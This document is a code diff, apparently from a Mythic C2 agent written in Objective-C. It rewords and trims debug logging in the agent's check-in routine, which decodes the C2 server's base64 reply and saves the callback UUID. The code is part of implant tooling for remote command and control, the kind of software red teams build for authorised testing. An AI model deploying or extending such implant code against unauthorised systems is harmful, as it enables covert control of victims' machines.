@@ -93,14 +93,12 @@ NSString *callbackUUID = nil;
         } else {
             NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
             if (httpResponse.statusCode == 200) {
-                NSLog(@"[DEBUG] Successfully checked in to C2.");
+                NSLog(@"[DEBUG] 🛜 Successfully checked-in with Mythic!");
                 if (data) {
                     NSString *responseString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
-                    NSLog(@"[DEBUG] Received response: %@", responseString);
+                    NSLog(@"[DEBUG] Raw check-in response: %@", responseString);
 
                     if ([responseString length] > 36) {
-                        NSLog(@"[DEBUG] Full response string (Base64): %@", responseString);
-                        
                         /// Decode the b64 response string
                         NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:responseString options:0];
                         if (decodedData == nil) {
@@ -116,8 +114,6 @@ NSString *callbackUUID = nil;
                         /// https://docs.mythic-c2.net/customizing/payload-type-development/create_tasking/agent-side-coding/agent-message-format
                         NSRange jsonRange = [decodedResponseString rangeOfString:@"{"];
                         if (jsonRange.location != NSNotFound) {
-                            NSLog(@"[DEBUG] Found '{' at index: %lu", (unsigned long)jsonRange.location);
-
                             // Extract the JSON part from the decoded response
                             NSString *responseWithoutUUID = [decodedResponseString substringFromIndex:jsonRange.location];
                             NSLog(@"[DEBUG] Extracted JSON string: %@", responseWithoutUUID);
@@ -132,21 +128,20 @@ NSString *callbackUUID = nil;
                             } else {
                                 NSLog(@"[DEBUG] Parsed JSON: %@", jsonResponse);
                                 if (jsonResponse[@"id"]) {
-                                    callbackUUID = jsonResponse[@"id"];  // Save the Callback UUID
-                                    NSLog(@"[DEBUG] New Callback UUID: %@", callbackUUID);
+                                    /// Save the Callback UUID this will be used for sending agent messages
+                                    callbackUUID = jsonResponse[@"id"];  
+                                    NSLog(@"[DEBUG] Our Callback UUID\t===>\t(%@)", callbackUUID);
                                 } else {
                                     NSLog(@"[ERROR] No 'id' key found in the JSON.");
                                 }
                             }
-                        } else {
-                            NSLog(@"[ERROR] Could not find '{' in the decoded response. Full decoded response: %@", decodedResponseString);
                         }
                     } else {
                         NSLog(@"[ERROR] Response is too short. Full response: %@", responseString);
                     }
                 }
             } else {
-                NSLog(@"[ERROR] Failed to check in. HTTP Status Code: %ld", (long)httpResponse.statusCode);
+                NSLog(@"[ERROR] Failed to check-in with Mythic!. HTTP Status Code: %ld", (long)httpResponse.statusCode);
             }
         }
         dispatch_semaphore_signal(sema);
